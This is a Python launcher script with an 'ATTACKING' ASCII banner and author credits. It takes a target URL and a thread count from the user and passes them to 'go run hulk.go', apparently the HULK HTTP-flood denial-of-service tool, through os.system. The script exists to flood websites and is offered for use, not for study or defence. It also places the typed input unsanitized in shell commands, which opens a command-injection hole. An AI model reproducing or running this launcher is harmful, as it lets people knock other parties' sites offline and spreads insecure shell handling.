from colorama import Fore, Back, Style
import os
import pyttsx3
import sys
import platform
def say_stuff(stuff_to_say):
    engine = pyttsx3.init()
    engine.say(str(stuff_to_say))
    engine.runAndWait()
if str(platform.system()) == 'Linux':
    os.system('')
    print(Fore.GREEN + ' █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗')
    print(Fore.GREEN + '██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝')
    print(Fore.GREEN + '███████║   ██║      ██║   ███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗')
    print(Fore.GREEN + '██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║')
    print(Fore.GREEN + '██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝')
    print(Fore.GREEN + '╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝')
    print("        "+Fore.LIGHTGREEN_EX +"        ══╦═════════════════════════════════╦══")
    print("        "+Fore.LIGHTGREEN_EX +"╔═════════╩═════════════════════════════════╩═════════╗")
    print("        "+Fore.LIGHTGREEN_EX +"║  \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"Coder   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Nguyen Quang Hung"+Fore.LIGHTGREEN_EX+"                      ║")
    print("        "+Fore.LIGHTGREEN_EX +"║  \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"Github  "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" https://github.com/QuangHuwngg"+Fore.LIGHTGREEN_EX+"         ║")
    print("        "+Fore.LIGHTGREEN_EX +"║  \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"Facebook"+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" https://www.facebook.com/quanghuwngg"+Fore.LIGHTGREEN_EX+"   ║")
    print("        "+Fore.LIGHTGREEN_EX +"╚═════════════════════════════════════════════════════╝") 
    print("")
else:
    os.system('')
    print('')
    print(Fore.GREEN + '                     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗')
    print(Fore.GREEN + '                    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝')
    print(Fore.GREEN + '                    ███████║   ██║      ██║   ███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗')
    print(Fore.GREEN + '                    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║')
    print(Fore.GREEN + '                    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝')
    print(Fore.GREEN + '                    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝')
    print("                            "+Fore.LIGHTGREEN_EX +"        ══╦═════════════════════════════════╦══")
    print("                            "+Fore.LIGHTGREEN_EX +"╔═════════╩═════════════════════════════════╩═════════╗")
    print("                            "+Fore.LIGHTGREEN_EX +"║  \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"Coder   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Nguyen Quang Hung"+Fore.LIGHTGREEN_EX+"                      ║")
    print("                            "+Fore.LIGHTGREEN_EX +"║  \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"Github  "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" https://github.com/QuangHuwngg"+Fore.LIGHTGREEN_EX+"         ║")
    print("                            "+Fore.LIGHTGREEN_EX +"║  \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"Facebook"+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" https://www.facebook.com/quanghuwngg"+Fore.LIGHTGREEN_EX+"   ║")
    print("                            "+Fore.LIGHTGREEN_EX +"╚═════════════════════════════════════════════════════╝") 
    print("")

try:
    site = input(Fore.LIGHTGREEN_EX+"╔═══"+Fore.CYAN+"["+Fore.LIGHTGREEN_EX+"Url"+Fore.CYAN+"]"+Fore.LIGHTGREEN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    threads = input('  \x1b[38;2;255;20;147m•' + Fore.WHITE + 'Time(s): ')
    print('')
    text = print(Fore.GREEN + 'Start Attacking . . .')

    if 'Windows' in str(platform.system()):
        os.system('go run hulk.go -site {0}'.format(site))
    else:
        os.system('NQHTOOL={0} go run hulk.go -site {1}'.format(threads,site))
    print(Back.BLACK + Fore.GREEN)
    
except:
    print('[+] Installing Dependancies')
    os.system('python3 Install_Dependancies.py')
    os.system('python Install_Dependancies.py')
    os.system('py Install_Dependancies.py')
